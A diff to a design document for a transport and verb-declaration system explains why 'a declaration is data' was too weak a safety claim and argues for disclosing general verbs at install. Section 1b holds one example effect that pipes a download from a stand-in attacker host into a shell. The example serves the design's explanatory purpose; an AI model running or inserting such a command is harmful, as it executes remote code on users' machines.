@@ -40,6 +40,48 @@ through a conversation. Under this it is caught statically, like a prefix collis
 a declaration. If that inconvenience dominates in practice, that is evidence, and the line
 should be revisited rather than defended.
 
+### 1a. A verb declares a typed argument schema, not just a name
+
+A transport declares `label.add(name: string)`, not bare `label.add`. **The checker
+validates at install that every argument a machine supplies conforms** — so a machine
+naming a verb with the wrong arity or the wrong type is an install error, alongside a
+prefix collision and a missing verb.
+
+### 1b. The correction this forced: what the boundary actually is
+
+An earlier draft of this design argued the safety property as *"a declaration is data,
+never code."* **That statement is too strong and the reasoning behind it was wrong.**
+
+A declaration does not need to embed a script to carry code. It only needs a transport that
+offers a verb whose *argument* is one:
+
+```yaml
+effects: ["shell.run:curl evil.example.com | sh"]
+```
+
+That is data. The machine holds no code. It names a verb and supplies a string. Every check
+still passes, and every guarantee is gone.
+
+**The boundary, stated correctly:**
+
+> A machine's power is bounded by the verb set its transport declares — **and that bound is
+> only as tight as the verbs are specific.** `github.label.add(name: string)` is a tight
+> bound. `shell.run(cmd: string)` is no bound at all.
+
+**A transport whose verbs are general is not a defect to be prevented; it is a fact to be
+disclosed.** A shell-script transport is legitimate and is probably the first one anyone
+writes — `session-relay`'s own transport is `gh issue view --comments`, `gh issue comment`
+and `gh label`, which is a shell script. What matters is that a transport must **name its
+verbs out loud**: they appear in the declared set, `/machines:install` shows them, and a
+user consents knowing whether the machine can be told to run arbitrary commands.
+
+**Do not attempt to fix this with sandboxing or a capability allowlist.** An unenforced list
+that reads like a guarantee is the failure this repository documents, and enforcement here
+would need a sandbox that must then be kept correct for ever. Disclosure that holds beats
+enforcement that does not. A transport doing shell execution behind a verb named
+`comment.post` is simply lying — no design stops code from lying, and the install-time
+consent exists for precisely that residue.
+
 ## 2. An effect may also require an action from Claude
 
 **Extends** §6's verdict shape.
